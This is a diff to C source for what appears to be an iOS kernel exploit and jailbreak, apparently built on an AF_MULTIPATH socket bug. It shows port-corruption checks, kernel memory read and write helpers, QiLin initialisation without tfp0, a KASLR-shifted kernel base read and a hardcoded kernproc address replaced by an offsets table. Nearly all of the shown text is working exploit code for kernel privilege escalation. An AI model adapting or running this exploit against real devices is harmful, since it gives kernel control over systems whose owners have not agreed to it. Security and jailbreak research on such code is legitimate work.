@@ -19,6 +19,8 @@
 #include <string.h>
 #include <unistd.h>
 
+uint64_t kernel_base = 0;
+
 #ifndef AF_MULTIPATH
 #define AF_MULTIPATH 39
 #endif
@@ -40,6 +42,7 @@ static void _init_port_with_empty_msg(mach_port_t port)
 
 static int _is_port_corrupt(mach_port_t port)
 {
+    
     kern_return_t err;
     mach_port_seqno_t msg_seqno = 0;
     mach_msg_size_t msg_size = 0;
@@ -54,8 +57,8 @@ static int _is_port_corrupt(mach_port_t port)
                              &msg_id,
                              (mach_msg_trailer_info_t)&msg_trailer,
                              &msg_trailer_size);
-    
     if (msg_id && (msg_id != 0x962)) {
+        printf("Port %#x is corrupt!\n", port);
         return 1;
     }
     
@@ -82,7 +85,7 @@ static int __writeKernelMemory(uint64_t Address, uint64_t Len, void *From)
 // This will not enable all QiLin features - but enough for us
 void _init_tfp0less_qilin(uint64_t kaslr_shift)
 {
-    uint64_t kernproc = 0xfffffff0076450a8 + kaslr_shift;
+    uint64_t kernproc = offsets.kernproc + kaslr_shift;
     uint64_t *m = (uint64_t *)mmap((void *)0x110000000, 0x4000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
     
     *m = (uint64_t)__readKernelMemory;
@@ -221,7 +224,7 @@ void jb_go(void)
     printf("Getting kernel r/w access...\n");
     kx_setup(refill_userclients, toolazy_ports, kaslr_shift, contained_port_addr);
     
-    uint64_t kernel_base = 0xfffffff007004000 + kaslr_shift;
+    kernel_base = 0xfffffff007004000 + kaslr_shift;
     uint32_t val = kread32(kernel_base);
     
     printf("kernelbase DWORD: %08X\n", val);
